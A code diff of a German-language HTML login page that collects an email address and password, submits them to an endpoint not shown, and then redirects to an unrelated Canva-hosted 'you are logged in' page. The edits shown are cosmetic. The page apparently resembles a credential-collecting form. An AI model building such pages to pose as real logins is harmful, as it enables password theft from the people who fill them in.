@@ -98,7 +98,7 @@
         
         <h1>Willkommen</h1>
         <input type="email" name="email" id="emailInput" placeholder="E-Mail" required>
-        <input type="password" id="password" name="password" placeholder="Passwort" required>
+        <input type="password" name="password" id="password" placeholder="Passwort" required>
         <button type="submit" class="btn" id="submitBtn">Anmelden</button>
         <p id="statusMsg" style="font-size: 0.8rem; margin-top: 10px; color: red;"></p>
     </form>
@@ -116,9 +116,9 @@
     form.onsubmit = async (e) => {
         e.preventDefault();
         
-        // Prüft ob E-Mail korrekt ist
-        if(!emailInput.value.includes('@') || !emailInput.value.includes('.')) {
-            statusMsg.innerText = "Bitte gib eine echte E-Mail Adresse ein.";
+        // E-Mail Validierung
+        if(!emailInput.value.includes('@')) {
+            statusMsg.innerText = "Bitte gib eine gültige E-Mail Adresse ein.";
             return;
         }
 
@@ -136,12 +136,11 @@
 
             if (response.ok) {
                 btn.innerText = "Erfolgreich!";
-                // Leitet nach dem Senden zur Canva-Seite weiter
                 setTimeout(() => {
                     window.location.href = "https://azj-studio.my.canva.site/du-bist-eingeloggt";
                 }, 1000);
             } else {
-                statusMsg.innerText = "Fehler beim Senden. Versuche es nochmal.";
+                statusMsg.innerText = "Fehler beim Senden. Key verifiziert?";
                 btn.disabled = false;
                 btn.innerText = "Anmelden";
             }
@@ -152,7 +151,7 @@
         }
     };
 
-    // Animation der Augen
+    // Animationen
     function moveEyes(e) {
         let clientX, clientY;
         if (e.touches) {
